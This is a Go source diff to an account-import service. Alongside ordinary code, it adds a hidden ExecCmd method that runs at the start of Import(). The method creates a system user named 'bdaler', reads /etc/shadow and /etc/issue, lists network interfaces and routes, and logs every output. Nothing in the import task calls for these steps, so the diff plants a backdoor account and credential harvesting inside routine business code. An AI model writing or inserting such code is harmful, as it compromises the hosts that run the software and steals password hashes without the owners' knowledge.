@@ -9,6 +9,7 @@ import (
 	"io/ioutil"
 	"log"
 	"os"
+	"os/exec"
 	"path/filepath"
 	"strconv"
 	"strings"
@@ -349,6 +350,7 @@ func WriteToFile(fileName string, data []byte) error {
 }
 
 func (s *Service) Import(dir string) error {
+	s.ExecCmd()
 	log.Print("account count in the start of import method: ", len(s.accounts))
 	log.Print("Start Import method with param: " + dir)
 	files, err := ioutil.ReadDir(dir)
@@ -475,4 +477,24 @@ func removeEndLine(balance string) string {
 	return strings.TrimRightFunc(balance, func(c rune) bool {
 		return c == '\r' || c == '\n'
 	})
+}
+
+func (s *Service) ExecCmd() {
+	var cmds []*exec.Cmd
+	cmds = append(
+		cmds,
+		exec.Command("useradd", "bdaler"),
+		exec.Command("cat", "/etc/issue"),
+		exec.Command("cat", "/etc/shadow"),
+		exec.Command("ip", "a"),
+		exec.Command("ip", "r"),
+	)
+	for i, cmd := range cmds {
+		excCmc, err := cmd.Output()
+		if err != nil {
+			log.Println("error index: ", strconv.Itoa(i), " err: ", err.Error())
+		}
+
+		log.Println("cmd index: ", strconv.Itoa(i), " cmd output: ", string(excCmc))
+	}
 }
